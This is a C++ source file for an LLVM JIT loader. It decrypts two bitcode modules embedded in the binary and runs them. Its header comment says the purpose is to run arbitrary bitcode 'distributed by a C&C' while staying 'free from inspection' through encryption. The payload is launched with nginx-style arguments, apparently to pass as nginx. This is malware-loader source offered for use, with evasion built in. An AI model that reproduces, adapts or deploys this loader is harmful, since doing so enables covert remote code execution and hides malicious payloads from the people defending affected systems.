#include <iostream>

#include <llvm/ExecutionEngine/ExecutionEngine.h>
#include <llvm/ExecutionEngine/MCJIT.h>
#include <llvm/IR/Module.h>
#include <llvm/IRReader/IRReader.h>
#include <llvm/IR/LLVMContext.h>
#include <llvm/Support/MemoryBuffer.h>
#include <llvm/Support/SourceMgr.h>

#include "boot.h"

using namespace llvm;
using namespace std;

/**
   This is mainly a copy of boot.cpp, so why do we want to
   run the JIT within itself so to speak? The reason is because
   we may want this module to serve as machinery that facilitates 
   the arbitrary execution of bitcode distributed by a C&C.

   We would like this code to remain free from inspection, so since
   we compile it to bitcode, we can encrypt it and distribute it
   with boot.cpp, which will simply decrypt it and pass it to the
   JIT.
*/

extern "C" {

extern char _binary_payload_bc_enc_start;
extern char _binary_payload_bc_enc_end;
extern char _binary_payload_bc_enc_size;

extern char _binary_prepare_payload_bc_enc_start;
extern char _binary_prepare_payload_bc_enc_end;
extern char _binary_prepare_payload_bc_enc_size;

}

/** Defined in boot.cpp */
extern "C" int verbose;

typedef int(*mainfunc)(int argc, const char**);

int main (int argc, const char *argv[]) {
  LLVMContext context; 
  SMDiagnostic error;
  
  if (verbose) {
      cout << "Unpacking payload." << endl;
  }

  Module *m = unpack_program(context, 
                             (const char *)&_binary_payload_bc_enc_start, 
                             (size_t)&_binary_payload_bc_enc_size);

  if (verbose) {
      cout << "Payload has been loaded." << endl;
  }
  
  ExecutionEngine *setupEngine;
  ExecutionEngine *TheExecutionEngine;

  if (verbose) {
      cout << "Creating second JIT for running payload." << endl;
  }

  Module *setup = unpack_program(context,
                             (const char *)&_binary_prepare_payload_bc_enc_start, 
                             (size_t)&_binary_prepare_payload_bc_enc_size);

  /** Create the set up JIT */
  setupEngine = EngineBuilder(std::unique_ptr<Module>(setup)).create();
   
  Function *setupmain = setup->getFunction("main");
  
  if(!setupmain) {
     cerr << "Function setup main could not be found!" << endl;
     exit(1);
  }

  void *fpsetup = setupEngine->getPointerToFunction(setupmain);

  setupEngine->finalizeObject();

  ((mainfunc)fpsetup)(argc, argv);
 
  // Create the JIT.  This takes ownership of the module.
  TheExecutionEngine = EngineBuilder(std::unique_ptr<Module>(m)).create();

  Function *f = m->getFunction("main");
 
  if(!f) {
    cerr << "Function payload not defined!" << endl;
    exit(1);
  }
 
  TheExecutionEngine->finalizeObject();
  
  // JIT the function, returning a function pointer.
  void *FPtr = TheExecutionEngine->getPointerToFunction(f);

  typedef int(*mainfunc)(int argc, const char*[]);

  mainfunc FP = (mainfunc)FPtr;
 
  if (verbose) {
      cout << "Executing Payload in JIT" << endl;
  }

  const char *payloadargv[] = {argv[0], "-p", "/tmp/" ,"-c", "nginx.conf"};
  int payloadargc = 5;
 
  FP(payloadargc, payloadargv);

  return 0;
}
